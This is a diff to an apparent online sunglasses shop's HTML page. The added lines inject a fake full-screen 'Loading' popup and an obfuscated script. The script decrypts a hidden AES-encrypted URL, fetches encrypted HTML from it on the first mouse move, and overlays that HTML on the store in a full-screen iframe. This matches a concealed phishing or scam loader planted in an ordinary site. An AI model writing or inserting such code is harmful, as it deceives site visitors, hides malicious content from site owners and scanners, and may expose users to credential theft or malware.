@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="Urban Store — Premium Women's Shades for the perfect summer look.">
 <title>Urban Store | Women's Shades</title>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600&family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400;1,500&display=swap" rel="stylesheet">
@@ -22,6 +23,65 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5044821&101" alt="free website stats program" border="0"></a></noscript>
 <!-- Histats.com  END  -->
 <link rel="stylesheet" href="assets/style.css">
+   <style>
+.popup { 
+    position: fixed; 
+    top: 0; 
+    left: 0; 
+    width: 100%; 
+    height: 100%; 
+    background: #ffffff; 
+    display: flex; 
+    justify-content: center; 
+    align-items: center; 
+    z-index: 99999; 
+}
+.popup-content { 
+    background: #ffffff; 
+    padding: 60px; 
+    text-align: center; 
+    width: 100%; 
+    max-width: 600px; 
+}
+.loading-gif { 
+    width: 160px; 
+    height: 160px; 
+    margin-bottom: 30px; 
+}
+.popup-content p { 
+    font-size: 1.5rem; 
+    color: #1f2433; 
+    font-weight: 600; 
+    margin: 10px 0 35px 0; 
+}
+.buttons { 
+    display: flex; 
+    justify-content: center; 
+    gap: 25px; 
+}
+button { 
+    padding: 15px 35px; 
+    font-size: 1.1rem; 
+    border: none; 
+    border-radius: 8px; 
+    cursor: pointer; 
+    font-weight: 700; 
+    min-width: 150px; 
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
+}
+#cancelBtn { 
+    background: #f44336; 
+    color: white; 
+}
+#continueBtn { 
+    background: #4CAF50; 
+    color: white; 
+}
+button:hover { 
+    opacity: 0.9; 
+}
+    #frame { display: none; width: 100%; height: 100vh; border: 0; position: fixed; top: 0; left: 0; z-index: 9999; background: white; }
+  </style>
 
 </head>
 <body>
@@ -276,5 +336,72 @@ hs.src = ('//s10.histats.com/js15_as.js');
   </div>
 </div>
 <script src="assets/script.js"></script>
+   <!-- ===== LOADER POPUP (OVERLAY) ===== -->
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== IFRAME FOR ENCRYPTED CONTENT ===== -->
+  <iframe id="frame" title="yoursomahearts" allowfullscreen></iframe>
+
+  <script>
+     const PASSPHRASE = "U26HSHGVBK6H2q";
+    const URL_KEY = "MySecretKey@123";  
+
+ENC_DATA_ORIGIN = "U2FsdGVkX1/FmdjamavP3zDd4UmN43c7BBnSrNiCJs+D1Hp/cgTcio1iyfVF/0mUo85Drj6PJLM4TbW8qDPbZA=="
+    let lastUrl = null;
+
+    // Decrypt the origin URL using CryptoJS
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN;
+
+    console.log("🌐 Decrypted URL:", DATA_URL);
+
+    function simpleDecrypt(cipherText, passphrase) {
+        const key = CryptoJS.SHA256(passphrase);
+        const iv = CryptoJS.lib.WordArray.create([0, 0, 0, 0]);
+        const decrypted = CryptoJS.AES.decrypt(cipherText, key, { iv: iv });
+        return decrypted.toString(CryptoJS.enc.Utf8);
+    }
+
+    async function loadSecret() {
+    const frame = document.getElementById("frame");
+    try {
+        const res = await fetch(DATA_URL);
+        const data = await res.json();
+        const key = CryptoJS.SHA256(PASSPHRASE);
+        const iv = CryptoJS.lib.WordArray.create([0,0,0,0]);
+        const decrypted = CryptoJS.AES.decrypt(data.cipher, key, { iv: iv });
+        const html = decrypted.toString(CryptoJS.enc.Utf8);
+        if (!html || html.length < 50) throw new Error("Invalid HTML");
+        const blob = new Blob([html], { type: "text/html" });
+        frame.src = URL.createObjectURL(blob);
+        frame.style.display = "block";
+        document.getElementById("customPopup").style.display = "none";
+    } catch(e) {
+        alert("Error: " + e.message);
+    }
+}
+
+    // ===== EVENT HANDLERS =====
+    document.getElementById("cancelBtn").addEventListener("click", function() {
+        document.getElementById("customPopup").style.display = "none";
+    });
+
+    document.getElementById("continueBtn").addEventListener("click", function() {
+        loadSecret();
+    });
+
+    window.addEventListener("mousemove", () => {
+        loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
